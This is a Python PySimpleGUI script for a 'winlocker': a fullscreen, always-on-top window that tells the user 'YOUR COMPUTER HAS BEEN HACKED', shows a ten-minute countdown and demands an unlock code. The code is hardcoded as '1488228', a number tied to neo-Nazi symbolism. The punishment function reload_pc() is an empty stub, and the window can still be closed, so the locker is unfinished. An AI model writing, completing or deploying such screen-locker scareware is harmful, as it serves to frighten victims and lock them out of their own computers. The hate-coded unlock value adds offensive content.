import PySimpleGUI as sg
from time import time

LOCKING_TIME = 600.00
CODE = "1488228"

def time_prettyfier(time):
	#function for formating time from just seconds to mm:ss format
	minutes_raw = str(time // 60)
	mm = minutes_raw if len(minutes_raw) > 1 else "0" + minutes_raw
	seconds_raw = str(round(time % 60))
	ss =  seconds_raw if len(seconds_raw) > 1 else "0" + seconds_raw
	return mm + ":" + ss
def reload_pc():
	pass
sg.theme("black")
sg.set_options(font = 'Roboto 30', element_padding = (2, 20))
layout = [
	[sg.VPush()],
	[sg.Push(), sg.Input("", readonly = True, text_color = '#000000',key = '-INPUT-'), sg.Push()],
	[sg.Push(), sg.Button("0"), sg.Button("1"), sg.Button("2"), sg.Button("3"), sg.Button("4"), sg.Button("5"), sg.Button("6"), sg.Button("7"), sg.Button("8"), sg.Button("9"), sg.Button("Enter", key = '-ENTER-'), sg.Button("Clear", key = '-CLEAR-'), sg.Push()],
	[sg.Text("YOUR COMPUTER HAS BEEN HACKED BY [ODN] EGORIO.\nFOR UNLOCKING DEVICE, ENTER THE CODE.", justification = "center")],
	[sg.Text("10:00", key = '-TIMER-', font = 'Roboto 30')],
	[sg.VPush()]
]

window = sg.Window("winlocker", layout, no_titlebar = True, keep_on_top = True, force_toplevel = True, element_justification = "center", location = (0,0)).Finalize() #creating window above all the current applications 
window.Maximize() #maximizing window(making it fullscreen)

start_time = time()
current_input = ""
attempts = 5

while True:
	event, values = window.read(timeout = 100) #setting window update time to 10 miliseconds
	if event == sg.WIN_CLOSED:  #for developing purpose :)
		break
	if round(LOCKING_TIME - abs(time() - start_time)) <= 0:
		reload_pc()
	else:
		if event in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
			if len(current_input) < 7:
				current_input += event
				window['-INPUT-'].update(current_input)
		if event == "-ENTER-":
			if current_input == CODE:
				break
			else:
				attempts -= 1
				current_input = ""
				window['-INPUT-'].update("")
				if attempts == 0:
					reload_pc()
		if event == "-CLEAR-":
			current_input = ""
			window['-INPUT-'].update("")
		window['-TIMER-'].update(time_prettyfier(round(LOCKING_TIME - abs(time() - start_time))))
window.close()
